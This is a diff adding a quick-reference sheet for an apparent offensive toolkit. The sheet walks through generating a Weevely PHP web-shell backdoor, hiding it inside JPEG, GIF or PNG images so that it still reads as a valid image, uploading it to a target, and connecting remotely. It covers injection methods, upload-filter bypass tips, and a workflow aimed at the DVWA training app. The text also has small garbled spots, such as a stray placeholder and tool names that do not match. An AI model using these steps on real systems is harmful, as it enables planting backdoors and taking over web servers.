@@ -1,0 +1,154 @@
+╔══════════════════════════════════════════════════════════════════════╗
+║                  SILENTTAG - QUICK REFERENCE                         ║
+╚══════════════════════════════════════════════════════════════════════╝
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ BASIC USAGE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. GENERATE BACKDOOR
+   $ weevely generate PASSWORD backdoor.php
+
+2. CREATE/GET IMAGE
+   $ python3 silenttag_cli.py --create-sample image.jpg
+   (or use any real image file)
+
+3. INJECT SHELL
+   $ python3 silenttag_cli.py image.jpg backdoor.php -o malicious.jpg
+
+4. UPLOAD & CONNECT
+   Upload malicious.jpg to target, then:
+   $ weevely http://target.com/uploads/malicious.jpg PASSWORD
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ COMMAND EXAMPLES
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Basic injection:
+  python3 silenttag_cli.py photo.jpg shell.php
+
+With output name:
+  python3 silenttag_cli.py photo.jpg shell.php -o payload.jpg
+
+Different method:
+  python3 silenttag_cli.py photo.jpg shell.php -m prepend
+
+Create sample:
+  python3 silenttag_cli.py --create-sample test.gif
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ INJECTION METHODS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+append  (default)  - Append shell to end of image
+                     Most compatible, works with all formats
+
+prepend            - Image header + PHP + image data
+                     Maintains valid image structure
+
+comment            - Inject into image metadata
+                     Stealthier, format-specific
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ COMPLETE WORKFLOW
+
+# Generate backdoor
+$ weevely generate mypass backdoor.php
+
+# Get/create image
+$ wget https://example.com/cat.jpg
+# Create/create image
+$ python3 silenttag_cli.py --create-sample cat.jpg
+
+# Inject
+$ python3 silenttag_cli.py cat.jpg backdoor.php -o evil_cat.jpg
+
+# Verify
+$ file evil_cat.jpg
+evil_cat.jpg: JPEG image data...  ← Appears as valid image!
+
+{{ ... }}
+$ curl -F "file=@evil_cat.jpg" http://target.com/upload
+
+# Connect
+$ weevely http://target.com/uploads/evil_cat.jpg mypass
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ SUPPORTED FORMATS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+✓ JPEG/JPG  - Excellent (recommended)
+✓ GIF       - Excellent (best for bypasses)
+✓ PNG       - Good
+✓ BMP       - Basic support
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ TESTING & VERIFICATION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Check file type:
+  $ file payload.jpg
+
+Check magic bytes:
+  $ xxd payload.jpg | head
+
+Test locally:
+  $ php -r "include 'payload.jpg';"
+
+Check accessibility:
+  $ curl -I http://target.com/uploads/payload.jpg
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ DVWA SPECIFIC WORKFLOW
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# 1. Create backdoor
+$ weevely generate dvwa123 dvwa_shell.php
+
+# 2. Create GIF image (GIF works best with DVWA)
+$ python3 shell_injector.py --create-sample innocent.gif
+
+# 3. Inject shell
+$ python3 shell_injector.py innocent.gif dvwa_shell.php -o payload.gif
+
+# 4. Upload via script or browser
+# Via browser: Navigate to File Upload page, select payload.gif
+# Via script: Modify upload_bypass.py to use payload.gif
+
+# 5. Connect
+$ weevely http://192.168.43.106/dvwa/hackable/uploads/payload.gif dvwa123
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ TROUBLESHOOTING
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Upload rejected?
+  → Try different format (GIF usually most permissive)
+  → Use real image instead of generated one
+  → Try different injection method (-m prepend)
+
+Shell not executing?
+  → Check if uploads directory allows PHP execution
+  → Verify file uploaded to correct path
+  → Test direct access via curl
+
+Weevely won't connect?
+  → Ensure Python 3.13 fix applied (./fix_weevely.sh)
+  → Test file is accessible (HTTP 200)
+  → Verify password is correct
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ FILES IN THIS TOOLKIT
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+shell_injector.py       - Main injection tool
+INJECTOR_USAGE.md       - Detailed documentation
+QUICK_REFERENCE.txt     - This file
+demo_injector.sh        - Demo script
+upload_bypass.py        - DVWA upload script
+fix_weevely.sh          - Weevely Python 3.13 fix
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ TIP: Run demo script to see full workflow
+ $ ./demo_injector.sh
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
